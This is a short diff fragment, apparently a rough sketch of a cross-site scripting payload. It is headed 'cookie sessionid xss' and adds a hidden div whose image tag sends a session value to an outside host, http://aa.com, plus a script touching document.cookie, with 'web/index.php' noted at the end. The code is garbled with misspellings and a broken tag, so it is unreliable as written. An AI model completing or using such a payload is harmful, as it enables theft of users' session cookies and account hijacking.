@@ -1,0 +1,11 @@
+cookie   sessionid xss
+<div style="disply:none;">
+    &gt;img src="http://aa.com?session=" alt="">
+</div>
+<script>
+    documment.cookie('')
+</script>
+
+
+
+web/index.php
